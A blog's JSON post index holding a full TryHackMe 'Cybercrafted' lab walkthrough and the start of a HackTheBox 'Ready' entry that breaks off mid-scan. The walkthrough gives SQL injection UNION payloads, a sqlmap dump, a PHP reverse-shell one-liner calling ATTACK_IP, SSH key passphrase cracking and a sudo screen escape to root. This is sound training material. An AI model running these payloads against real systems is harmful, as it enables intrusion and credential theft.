[ { "title": "Cybercrafted", "url": "/posts/cybercrafted/", "categories": "TryHackMe", "tags": "tryhackme, sqli, sqlmap, ssh2john, screen", "date": "2021-11-21 09:00:00 -0600", "snippet": "IntroCybercraftedThis is a medium TryHackMe box which houses a Mincraft server. We enumerate subdomains and pages across those subdomains to find a vulnerable page. We find one of those pages is vulnerable to SQL injection which gives us credentials to login to an admin panel. This login brings us to a page which allows us to execute commands on the server. From there we can spawn a reverse shell to access the box and find an exposed ssh private key. With that we extract the passphrase hash off of the key, crack it, and ssh onto the box as the admin. From there we find credentials leaked in a log file which allows to switch to another user. That user is allowed to run a sudo command which allows us to spawn a root shell.EnumerationNmapTo get started, we begin with an nmap of the machine to find any open ports. I like to find all open ports to begin with, but it can be very time consuming. This nmap scan seems to work well within these isolated learning environmets to quickly find open ports on a system:sudo nmap -v --min-rate 10000 10.10.70.248 -p-Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:07 GMTInitiating ARP Ping Scan at 03:07Scanning 10.10.70.248 [1 port]Completed ARP Ping Scan at 03:07, 0.22s elapsed (1 total hosts)Initiating SYN Stealth Scan at 03:07Scanning admin.cybercrafted.thm (10.10.70.248) [65535 ports]Discovered open port 80/tcp on 10.10.70.248Discovered open port 22/tcp on 10.10.70.248Discovered open port 25565/tcp on 10.10.70.248Completed SYN Stealth Scan at 03:07, 8.76s elapsed (65535 total ports)Nmap scan report for admin.cybercrafted.thm (10.10.70.248)Host is up (0.00059s latency).Not shown: 65532 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http25565/tcp open minecraftMAC Address: 02:62:A3:C2:8E:83 (Unknown)Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 9.12 seconds Raw packets sent: 85547 (3.764MB) | Rcvd: 85547 (3.422MB)This answers the first question. How many ports are open?Now that we know what the ports are, we can run some default scripts against them to tell us more information about the services those ports are hosting:sudo nmap -A 10.10.70.248 -p22,80,25565Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-21 03:13 GMTNmap scan report for admin.cybercrafted.thm (10.10.70.248)Host is up (0.00046s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)| 256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)|_ 256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (EdDSA)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Log In25565/tcp open minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r ck00r, Users: 0/1)MAC Address: 02:62:A3:C2:8E:83 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.8 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.8 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.46 ms admin.cybercrafted.thm (10.10.70.248)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.45 secondsThe output here shows us what is running on the highest port. What service runs on the highest port?In the traceroute section of the output, we see a domain address admin.cybercrafted.thm. We’ll add this to our /etc/hosts to access the site via virtual routing.SubdomainsViewing the results of the Nmap output, we know that this server is hosting an http service. Typing the address http://10.10.70.248 into the address bar of our browser returns an error:It appears to be redirecting to http://cybercrafted.thm. We’ll add this to our /etc/hosts file as well and retry the site.The next question is asking if there are any subdomains. We’ve already seen one in the Nmap results, admin.cybercrafted.thm, but how would we find more? For this challenge I’m going to use gobuster. This server appears to already be virtually hosting a subdomain of admin so we’ll use gobusters vhost mode to enumerate potential subdomains. A great resource in wordlists is Daniel Miesslers SecLists. If you aren’t using TryHackMe’s AttackBox, I’d recommend installing it on your own attack machine.gobuster vhost -u cybercrafted.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt ===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://cybercrafted.thm[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2021/11/21 03:53:23 Starting gobuster===============================================================Found: store.cybercrafted.thm (Status: 403) [Size: 287]Found: admin.cybercrafted.thm (Status: 200) [Size: 937]Found: www.store.cybercrafted.thm (Status: 403) [Size: 291]Found: www.admin.cybercrafted.thm (Status: 200) [Size: 937]---[snip]---This is where I admittedly kept running into consistency issues. I used several wordlists under the /DNS directory and found the same couple of domains popping up: store and admin. Currently there is no way to filter out status codes using vhost mode on gobuster so there are times where the output gets flooded with 400 status codes. With the final subdmain shown to be three characters, I guess it was the most common one being www and it turned out to be correct. So far this should be what our /etc/hosts file looks like:127.0.0.1 localhost127.0.1.1 tryhackme.lan tryhackme10.10.70.248 admin.cybercrafted.thm store.cybercrafted.thm www.cybercrafted.thm cybercrafted.thm# The following lines are desirable for IPv6 capable hosts::1 localhost ip6-localhost ip6-loopbackff02::1 ip6-allnodesff02::2 ip6-allrouters Any subdomains? (Alphabetical order)DirectoriesNext up comes finding what directories/pages on on these domains. We’ll use gobusters dir mode to do this. First we’ll start with www.cybercrafted.thmgobuster dir -u http://www.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x html===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://www.cybercrafted.thm/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Status codes: 200,301,302[+] User Agent: gobuster/3.0.1[+] Extensions: html[+] Timeout: 10s===============================================================2021/11/21 04:08:35 Starting gobuster===============================================================/index.html (Status: 200)/assets (Status: 301)/. (Status: 200)/secret (Status: 301)===============================================================2021/11/21 04:08:43 Finished===============================================================Oh secrets??Oh…They are only pictures. Perhaps there’s hidden info embedded within the images, but we’ll shelve that for now. Let’s keep looking for other pages. Next up is admin.cybercrafted.thm:gobuster dir -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://admin.cybercrafted.thm/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Status codes: 200,301,302[+] User Agent: gobuster/3.0.1[+] Extensions: php[+] Timeout: 10s===============================================================2021/11/21 04:14:11 Starting gobuster===============================================================/index.php (Status: 200)/login.php (Status: 302)/assets (Status: 301)/. (Status: 200)/panel.php (Status: 302)===============================================================2021/11/21 04:14:20 Finished===============================================================All of the 300 codes redirect to /index.php which is the login page. Perhaps this where the vulnerability lies.Running through some very common default credentials (admin:admin, admin:password, admin:password123, root:root, root:password) doesn’t provide any give.Next trying some XSS payloads, and some potential SQL Injection doesn’t show promise either. We’ll look at the next domain:gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://store.cybercrafted.thm/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Status codes: 200,301,302[+] User Agent: gobuster/3.0.1[+] Extensions: php[+] Timeout: 10s===============================================================2021/11/21 04:27:45 Starting gobuster===============================================================/xxxxxx.php (Status: 200)/assets (Status: 301)===============================================================2021/11/21 04:27:55 Finished===============================================================It look like we have another input field to mess with.We’ll run throught the other steps with this domain as well.We get some results the search &#39; OR 1=1-- - is used. This appears to be SQL injectable On what page did you find the vulnerability?ExploitationSQLiIf you haven’t already, I would recommend checking out PortSwiggers Web Academy on SQL Injection. We’ll try a UNION attack on the database. For a UNION query to work, two key requirements must be met: The individual queries must return the same number of columns.The data types in each column must be compatible between the individual queries.To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out: How many columns are being returned from the original query?Which columns returned from the original query are of a suitable data type to hold the results from the injected query?Since error messages don’t appear to be returned to the webpage with a broken SQL query, we’ll use NULLs to to find the number of columns. Starting off with &#39; UNION SELECT NULL-- - shows nothing in the results. That’s okay. We’ll keep adding NULLs until we get a successful return. With the query &#39; UNION SELECT NULL,NULL,NULL,NULL-- - we see some results. Now we now there are four columns.Now to get the available tables, we can use the query &#39; UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables-- -The admin table at the bottom looks promising. Next we’ll see what fields the admin table has with &#39; UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name=&#39;admin&#39;-- -The admin table has an id, user, and hash field. To view the values from the fields, we’ll finish of this injection with &#39; UNION SELECT NULL,NULL,user,hash FROM admin-- -Now if you wanted a script to take care of figuring this all out for you, you could have used sqlmapsqlmap -u &quot;store.cybercrafted.thm/xxxxxx.php&quot; --method POST --data &quot;search=doesnt&amp;amp;submit=matter&quot; -p search --batch --dump ___ __H__ ___ ___[)]_____ ___ ___ {1.2.4#stable}|_ -| . [)] | .&#39;| . ||___|_ [&#39;]_|_|_|__,| _| |_|V |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 05:18:28[05:18:28] [INFO] testing connection to the target URL[05:18:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS[05:18:28] [INFO] testing if the target URL content is stable[05:18:29] [INFO] target URL content is stable[05:18:29] [WARNING] heuristic (basic) test shows that POST parameter &#39;search&#39; might not be injectable[05:18:29] [INFO] testing for SQL injection on POST parameter &#39;search&#39;[05:18:29] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;[05:18:29] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - Parameter replace&#39;[05:18:29] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;[05:18:29] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;[05:18:29] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;[05:18:30] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;[05:18:30] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace (FLOOR)&#39;[05:18:30] [INFO] testing &#39;MySQL inline queries&#39;[05:18:30] [INFO] testing &#39;PostgreSQL inline queries&#39;[05:18:30] [INFO] testing &#39;Microsoft SQL Server/Sybase inline queries&#39;[05:18:30] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 stacked queries (comment)&#39;[05:18:30] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked queries (comment)&#39;[05:18:30] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;[05:18:30] [INFO] testing &#39;MySQL &amp;gt;= 5.0.12 AND time-based blind&#39;[05:18:30] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind&#39;[05:18:30] [INFO] testing &#39;Microsoft SQL Server/Sybase time-based blind (IF)&#39;[05:18:30] [INFO] testing &#39;Oracle AND time-based blind&#39;[05:18:30] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;[05:18:30] [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[05:18:30] [INFO] target URL appears to have 4 columns in query[05:18:30] [WARNING] applying generic concatenation (CONCAT)[05:18:30] [INFO] POST parameter &#39;search&#39; is &#39;Generic UNION query (NULL) - 1 to 10 columns&#39; injectable[05:18:30] [INFO] checking if the injection point on POST parameter &#39;search&#39; is a false positivePOST parameter &#39;search&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:---Parameter: search (POST) Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: search=doesnt&#39; UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT(&#39;qqbpq&#39;,&#39;tCMDIXovbmVxcjxBkbxvhDNNverteIdImoAtEJRH&#39;),&#39;qqbqq&#39;)-- YnFh&amp;amp;submit=matter---[05:18:30] [INFO] testing MySQL[05:18:30] [INFO] confirming MySQL[05:18:30] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.29back-end DBMS: MySQL &amp;gt;= 5.0.0[05:18:30] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries[05:18:30] [INFO] fetching current database[05:18:30] [INFO] fetching tables for database: &#39;webapp&#39;[05:18:30] [INFO] fetching columns for table &#39;admin&#39; in database &#39;webapp&#39;[05:18:30] [INFO] fetching entries for table &#39;admin&#39; in database &#39;webapp&#39;[05:18:30] [INFO] recognized possible password hashes in column &#39;hash&#39;do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] Ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y[05:18:30] [INFO] using hash method &#39;sha1_generic_passwd&#39;what dictionary do you want to use?[1] default dictionary file &#39;/usr/share/sqlmap/txt/wordlist.zip&#39; (press Enter)[2] custom dictionary file[3] file with list of dictionary files&amp;gt; 1[05:18:30] [INFO] using default dictionarydo you want to use common password suffixes? (slow!) [y/N] N[05:18:30] [INFO] starting dictionary-based cracking (sha1_generic_passwd)[05:18:30] [INFO] starting 2 processes [05:18:39] [WARNING] no clear password(s) found Database: webappTable: admin[2 entries]+----+------------------------------------------+---------------------+| id | hash | user |+----+------------------------------------------+---------------------+| 1 | 8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1 | xXUxxxxxxxxxxxxxxxx || 4 | THM{bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx8} | web_flag |+----+------------------------------------------+---------------------+ What is the admin’s username? What is the the web flag?Code ExecutionThere are a few ways to go about using the hash we see here. I prefer to just run the hash against a rainbow table for some low hanging fruit. Should that not work, there’s always JohnTheRipper or HashCat. Going to CrackStation, I pop the hash in the field, click submit, and get a hitNow that we have credentials, we can try to login to the admin panel at admin.cybercrafted.thm.We have a successful login with an interesting pageTyping in id returns uid=33(www-data) gid=33(www-data) groups=33(www-data). So this returns any system command from the host machine. With this page being ran by php, I’m going to play it safe and try setting up a php reverse shell. First I’ll setup a netcat listener in my terminal~# nc -lvnp 8080Listening on [0.0.0.0] (family 0, port 8080)Then I’ll modify the php reverse shell script I snagged off of pentestmonkeyphp -r &#39;$sock=fsockopen(&quot;ATTACK_IP&quot;,8080);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;and paste into the panel.php page and click enter. Going back to the terminal, there is a successful connection!~# nc -lvnp 8080Listening on [0.0.0.0] (family 0, port 8080)Connection from 10.10.155.126 54646 received!/bin/sh: 0: can&#39;t access tty; job control turned off$ whoamiwww-data$ uname -aLinux cybercrafted 4.15.0-159-generic #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux$ hostnamecybercraftedSince this box has python3, I’ll setup a more stable shell with python. You can follow this guide to do the same. Just remember to use python3 instead of python when running the commands.Lateral MovementI tend to view which users are on a machine when I first get onto a box. Checking out /home I find there are two users.www-data@cybercrafted:/var/www/admin$ ls -al /hometotal 16drwxr-xr-x 4 root root 4096 Jun 27 17:50 .drwxr-xr-x 24 root root 4096 Sep 30 13:14 ..drwxr-x--- 4 cybercrafted cybercrafted 4096 Sep 12 10:33 cybercrafteddrwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 xxxxxxxxxxxxxxxxxxxWhat’s interesting here is the permission on the users folder. Even though this folder is owned by the admin, the permissions show that anyone can navigate into the admins home folder. So we’ll do just that.www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx$ ls -altotal 32drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 .drwxr-xr-x 4 root root 4096 Jun 27 17:50 ..lrwxrwxrwx 1 root root 9 Sep 12 10:38 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 220 Jun 27 09:19 .bash_logout-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 3771 Jun 27 09:19 .bashrcdrwx------ 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .cachedrwx------ 3 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .gnupg-rw-rw-r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 0 Jun 27 17:40 .hushlogin-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 807 Jun 27 09:19 .profiledrwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .sshlrwxrwxrwx 1 root root 9 Oct 15 20:43 .viminfo -&amp;gt; /dev/nullThe SSH folder is also open to us. Let’s keep this going…www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ ls -altotal 16drwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 ..-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 414 Jun 27 09:33 authorized_keys-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 1766 Jun 27 09:33 id_rsaI see a private key (id_rsa) that is viewable to anyone. I’m going to copy the contents of the file and paste them into a file on my machine and use that private key to attempt to login as this user.First we need to cat out the filewww-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ cat id_rsa-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U---[snip]---Then copy and paste the contents into a file on our own box. Don’t forget to change the permissions of the file after you save it: chmod 400 admin_rsaWith the private key, we can now attempt to login as the admin:root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126The authenticity of host &#39;10.10.155.126 (10.10.155.126)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &#39;10.10.155.126&#39; (ECDSA) to the list of known hosts.Enter passphrase for key &#39;admin_rsa&#39;: It appears the private key has passphrase. No worries, ssh2john.py can pull the hash off of the key for us. Once we have the hash, JohnTheRipper can be used to decypt the hash file.root@ip-10-10-168-165:~# /opt/john/ssh2john.py admin_rsa &amp;gt; admin_rsa.hashroot@ip-10-10-168-165:~# john --wordlist=/usr/share/wordlists/rockyou.txt admin_rsa.hashNote: This format may emit false positives, so it will keep trying even after finding apossible candidate.Warning: detected hash type &quot;SSH&quot;, but the string is also recognized as &quot;ssh-opencl&quot;Use the &quot;--format=ssh-opencl&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusxxxxxxxxxxx (admin_rsa)1g 0:00:00:16 DONE (2021-11-21 06:20) 0.05906g/s 847117p/s 847117c/s 847117C/s *7¡Vamos!Session completed.With the passphrase now in hand, we can try to ssh once again:root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126Enter passphrase for key &#39;admin_rsa&#39;: xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ And we’re in!First things first, we need to learn more about this user. We should see what groups they are associate with. To do this, we can use cat /etc/group to view all groups and see who’s associated with each one, or we can just use the command groupsxxxxxxxxxxxxxxxxxxx@cybercrafted:~$ groupsxxxxxxxxxxxxxxxxxxx minecraftIt appears our user is a part of the minecraft group. Next we should see what files this group can view.xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ find / -type f -group minecraft 2&amp;gt;/dev/null/opt/minecraft/note.txt/opt/minecraft/minecraft_server_flag.txt/opt/minecraft/cybercrafted/help.yml/opt/minecraft/cybercrafted/commands.yml/opt/minecraft/cybercrafted/world/level.dat_mcr/opt/minecraft/cybercrafted/world/session.lock/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat--[snip]--This command says to find starting at root (/) all files (-type f) with group minecraft and send all errors to the abyss (/dev/null).And near the top, we see minecraft_server_flag.txt Can you get the Mincraft server flag?In the /opt/minecraft directory, there is also a note which reads:Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)- cybercraftedP.SWill remove the whitelist soon.This leads into the next question. We navigated into the cybercrafted directory and list out the contents, there is a plugins directoryxxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted$ ls -altotal 19568drwxr-x--- 7 cybercrafted minecraft 4096 Jun 27 16:53 .drwxr-x--- 4 cybercrafted minecraft 4096 Jun 27 17:24 ..-rwxr-x--- 1 cybercrafted minecraft 109 Nov 21 14:25 banned-ips.txt-rwxr-x--- 1 cybercrafted minecraft 109 Nov 21 14:25 banned-players.txt-rwxr-x--- 1 cybercrafted minecraft 1491 Nov 21 14:25 bukkit.yml-rwxr-x--- 1 cybercrafted minecraft 623 Nov 21 14:25 commands.yml-rwxr-x--- 1 cybercrafted minecraft 19972709 Jun 27 08:21 craftbukkit-1.7.2-server.jar-rwxr-x--- 1 cybercrafted minecraft 2576 Jun 27 08:22 help.ymldrwxr-x--- 2 cybercrafted minecraft 4096 Nov 21 14:25 logs-rwxr-x--- 1 cybercrafted minecraft 0 Nov 21 14:25 ops.txt-rwxr-x--- 1 cybercrafted minecraft 0 Jun 27 08:22 permissions.ymldrwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 plugins-rwxr-x--- 1 cybercrafted minecraft 6441 Jun 27 09:08 server-icon.png-rwxr-x--- 1 cybercrafted minecraft 813 Nov 21 14:25 server.properties-rwxr-x--- 1 cybercrafted minecraft 0 Jun 27 08:22 white-list.txtdrwxr-x--- 9 cybercrafted minecraft 4096 Nov 21 14:50 worlddrwxr-x--- 5 cybercrafted minecraft 4096 Jun 27 08:51 world_netherdrwxr-x--- 5 cybercrafted minecraft 4096 Nov 21 14:50 world_the_endWithin plugins, there is only one directory and that directory contains some interesting files.xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ ls -altotal 24drwxr-x--- 2 cybercrafted minecraft 4096 Oct 6 09:59 .drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 ..-rwxr-x--- 1 cybercrafted minecraft 667 Nov 21 14:25 language.yml-rwxr-x--- 1 cybercrafted minecraft 943 Nov 21 14:25 log.txt-rwxr-x--- 1 cybercrafted minecraft 90 Jun 27 13:32 passwords.yml-rwxr-x--- 1 cybercrafted minecraft 25 Nov 21 14:25 settings.yml What is the name of the sketchy plugin?Naturally we would gravitate towards passwords.yml. The password hashes in this yaml file do not provide any use to us. We could attempt to run hashcat or john against these MD5 hashes, but we would only be able to decrypt the madrinch user and not the cybercrafted user. There are only three other files in this directory and I’m thinking logs.txt or possibly settings.yml might have some useful info.xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ cat log.txt[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:25:16] cybercrafted registered. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:47:34] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:57:29] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:57:54] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:58:46] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:59:01] madrinch logged in. PW: Password123[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/10/15 20:36:21] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/10/15 21:00:43] [BUKKIT-SERVER] Startet xxxxxxxxxxx!That spells it out easy enough for us. With the cybercrafted users password in hand, we can try to switch user (su)xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ su cybercraftedPassword: cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$Privilege EscalationKnowing what permissions a user is allowed to do, sudo is a pretty important one. We can view what sudo privileges the user can perform by typing sudo -lcybercrafted@cybercrafted:~$ sudo -l[sudo] password for cybercrafted: Matching Defaults entries for cybercrafted on cybercrafted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser cybercrafted may run the following commands on cybercrafted: (root) /usr/bin/screen -r cybercraftedThis user is allowed to run the command /usr/bin/screen -r cybercrafted with sudo. Screen is a windows manager for terminals much like tmux. So if we can use sudo to launch screen, we should be able to spawn terminals from screen which should inherit root privileges.Searching online we can find what commands to use to spawn shells from screen or we can use the linux manual to dig through the commands (man screen). When we run the command, we are reattaching to an existing session (-r cybercrafted) and from there all we have to is spawn new window with a shell (ctl+a c).# whoamiroot# iduid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)# ls -al /roottotal 52drwx------ 6 root root 4096 Oct 15 20:46 .drwxr-xr-x 24 root root 4096 Sep 30 13:14 ..lrwxrwxrwx 1 root root 9 Sep 12 09:33 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Jun 27 17:49 .cachedrwx------ 3 root root 4096 Jun 27 17:49 .gnupgdrwxr-xr-x 3 root root 4096 Oct 4 16:08 .local-rw------- 1 root root 664 Sep 12 10:27 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r----- 1 root root 38 Jun 27 17:30 root.txtdrwx------ 2 root root 4096 Jun 27 17:45 .ssh-rw------- 1 root root 10959 Oct 15 20:46 .viminfo Finish the job and give me the root flag!" }, { "title": "Ready", "url": "/posts/ready/", "categories": "HackTheBox", "tags": "htb, gitlab, docker", "date": "2021-05-24 00:00:00 -0500", "snippet": "ReadyEnumeration$ sudo nmap -sC -sV -oA nmap/ready 10.10.10.220 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 23:50 EDTNmap scan report for 10.10.10.220Host is up (0.066s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)5080/tcp open http nginx| http-robots.txt: 53 disallowed entries (15 shown)| / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit| http-title: Sign in \\xC2\\xB7 GitLab|_Requested resource was 